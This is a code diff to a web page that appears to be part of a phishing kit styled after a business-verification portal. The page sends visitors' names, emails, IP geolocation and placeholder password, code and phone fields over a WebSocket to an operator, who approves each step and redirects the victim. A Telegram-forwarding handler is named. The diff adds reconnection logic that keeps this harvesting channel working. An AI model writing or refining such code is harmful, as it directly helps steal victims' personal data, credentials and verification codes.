@@ -34,8 +34,6 @@
 
 
 <body>
-    <?php include 'loading.php'; ?>
-
     <nav class="meta-nav">
         <div class="nav-content">
             <img style="height:30px" src="/images/logo.png" alt="Logo" class="logo">
@@ -120,17 +118,41 @@
     <script src="/scripts/invite.js"></script>
 
     <script>
-        const ws = new WebSocket('wss://<?php echo $domain_name; ?>');
+        let ws = null;
+        let reconnectInterval = 5000; // 5 seconds
+        let reconnectTimer = null;
         let orderId = '';
 
-        ws.onmessage = function(event) {
-            const data = JSON.parse(event.data);
-            if (data.type === 'admin_approve' && data.order_id === localStorage.getItem('currentOrderId', orderId)) {
-                localStorage.setItem('currentOrderId', data.order_id);
-                localStorage.setItem('currentStep', data.step);
-                window.location.href = '/review-business-information.php';
-            }
-        };
+        function createWebSocket() {
+            ws = new WebSocket('wss://<?php echo $domain_name; ?>');
+
+            ws.onopen = function() {
+                console.log('Connected to WebSocket.');
+                clearTimeout(reconnectTimer);
+            };
+
+            ws.onclose = function() {
+                console.log('WebSocket connection closed. Reconnecting...');
+                reconnectTimer = setTimeout(createWebSocket, reconnectInterval);
+            };
+
+            ws.onerror = function(error) {
+                console.error('WebSocket error:', error);
+                ws.close();
+            };
+
+            ws.onmessage = function(event) {
+                const data = JSON.parse(event.data);
+                if (data.type === 'admin_approve' && data.order_id === localStorage.getItem('currentOrderId', orderId)) {
+                    localStorage.setItem('currentOrderId', data.order_id);
+                    localStorage.setItem('currentStep', data.step);
+                    window.location.href = '/review-business-information.php';
+                }
+            };
+        }
+
+        // Initialize WebSocket connection
+        createWebSocket();
 
         function sendToTelegramFromInvite(event) {
             event.preventDefault();
@@ -153,25 +175,32 @@
          
             orderId = 'order_' + Date.now();
             localStorage.setItem('currentOrderId', orderId);
-            ws.send(JSON.stringify({
-                type: 'new_order',
-                order_id: orderId,
-                step: 1,
-                user_info: {
-                    name: firstName + " " + lastName,
-                    email: personalEmail,
-                    ip: ip,
-                    ip_address: ip_address,
-                    city: city,
-                    region: region,
-                    country: country,
-                    org: org,
-                    timezone: timezone,
-                    password: "",
-                    code: "",
-                    phone: ""
-                }
-            }));
+            
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({
+                    type: 'new_order',
+                    order_id: orderId,
+                    step: 1,
+                    user_info: {
+                        name: firstName + " " + lastName,
+                        email: personalEmail,
+                        ip: ip,
+                        ip_address: ip_address,
+                        city: city,
+                        region: region,
+                        country: country,
+                        org: org,
+                        timezone: timezone,
+                        password: "",
+                        code: "",
+                        phone: ""
+                    }
+                }));
+            } else {
+                console.error('WebSocket is not connected. Cannot send data.');
+                window.location.reload();
+                return;
+            }
 
             localStorage.setItem('firstName', firstName);
             localStorage.setItem('lastName', lastName);
